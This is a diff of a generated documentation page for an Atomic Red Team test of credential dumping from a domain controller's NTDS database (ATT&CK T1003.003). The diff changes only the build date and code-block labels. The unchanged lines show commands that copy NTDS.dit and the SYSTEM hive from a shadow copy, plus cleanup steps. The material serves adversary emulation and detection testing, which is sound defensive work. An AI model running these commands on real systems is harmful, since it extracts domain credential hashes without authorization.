@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.003"
 attack_technique_name: "OS Credential Dumping: NTDS"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "c6237146-9ea6-4711-85c9-c56d263a6b03"
@@ -63,13 +63,13 @@ Target must be a Domain Controller
 
 ### Prerequisite Check
 
-```text
+```untitled
 reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 echo Sorry, Promoting this machine to a Domain Controller must be done manually
 ```
 
@@ -77,13 +77,13 @@ Volume shadow copy must exist
 
 ### Prerequisite Check
 
-```text
+```untitled
 if not exist #{vsc_name} (exit /b 1)
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 echo Run "Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'" to fulfill this requirement
 ```
 
@@ -91,13 +91,13 @@ Extract path must exist
 
 ### Prerequisite Check
 
-```text
+```untitled
 if not exist #{extract_path} (exit /b 1)
 ```
 
 ### Get Prerequisite
 
-```text
+```untitled
 mkdir #{extract_path}
 ```
 
@@ -108,7 +108,7 @@ mkdir #{extract_path}
 
 ### Command
 
-```commandprompt
+```cmd
 copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
 copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
 reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
@@ -116,7 +116,7 @@ reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del "#{extract_path}\ntds.dit"        >nul 2> nul
 del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
 del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
